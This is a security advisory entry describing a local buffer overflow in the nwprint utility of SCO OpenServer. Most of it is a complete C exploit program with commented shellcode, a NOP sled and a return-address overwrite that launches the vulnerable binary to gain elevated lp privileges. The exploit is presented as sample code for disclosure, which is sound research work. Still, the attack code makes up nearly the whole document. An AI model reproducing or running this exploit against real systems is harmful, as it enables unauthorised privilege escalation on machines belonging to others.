source: http://www.securityfocus.com/bid/12986/info

nwprint that is distributed with SCO OpenServer is prone to a local buffer overflow vulnerability. This issue arises because the application fails to perform boundary checks prior to copying user-supplied data into sensitive process buffers. A local attacker can gain elevated privileges (lp user) by exploiting this issue. 

/*
 * minervini at neuralnoise dot com (c) 2005
 * sample code exploiting a buffer overflow vulnerability in
 * NetWare Unix Client 1.1.0Ba on SCO OpenServer 5.0.7;
 */

#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#ifndef _PATH
# define _PATH ("/usr/lib/nucrt/bin/nwprint")
#endif

/*
 * this shellcode may sound a bit tricky; most of the work
 * is caused by SCO's way to call the kernel, lcall  $0x7,$0x0,
 * translated by the assembler in "\x9a\x00\x00\x00\x00\x07\x00";
 * to avoid zeroes i push the NOT-ed bytes on the stack, NOT them
 * and then jump to %esp;
 * if anyone knows a shorter way to do this execve, a mail is appreciated.
 */

char *scode =
  "\x31\xc9"             // xor    %ecx,%ecx
  "\x89\xe3"             // mov    %esp,%ebx
  "\x68\xd0\x8c\x97\xff" // push   $0xff978cd0
  "\x68\xd0\x9d\x96\x91" // push   $0x91969dd0
  "\x89\xe2"             // mov    %esp,%edx
  "\x68\xff\xf8\xff\x6f" // push   $0x6ffff8ff
  "\x68\x9a\xff\xff\xff" // push   $0xffffff9a
  "\x80\xf1\x10"         // xor    $0x10,%cl
  "\xf6\x13"             // notb   (%ebx)
  "\x4b"                 // dec    %ebx
  "\xe2\xfb"             // loop   $-3
  "\x91"                 // xchg   %eax,%ecx
  "\x50"                 // push   %eax
  "\x54"                 // push   %esp
  "\x52"                 // push   %edx
  "\x50"                 // push   %eax
  "\x34\x3b"             // xor    $0x3b,%al
  "\xff\xe3";            // jmp    *%ebx

unsigned long get_sp (void) {
   __asm__("movl %esp,%eax");
}

int main (int argc, char **argv) {

   int i, slen = strlen(scode), offset = 0;
   long ptr, *lptr;
   char *buf;

   if (argc > 1)
     offset = strtoul(argv[1], NULL, 0);

   buf = (char *)malloc(1024);
   memset(buf, 0, 1024);

   for (i = 0; i < (901 - slen); i++)
     buf[i] = 0x90;

   printf("shellcode length: %d\n", slen);

   for (i = (901 - slen); i < 901; i++)
     buf[i] = scode[i - (901 - slen)];

   lptr = (long *)(buf + 901);

   printf("address: 0x%lx\n", ptr = (get_sp() - offset));

   for (i = 0; i < 30; i++)
     *(lptr + i) = (int)ptr;

   execl(_PATH, "nwprint", buf, NULL);

   return(0);
}

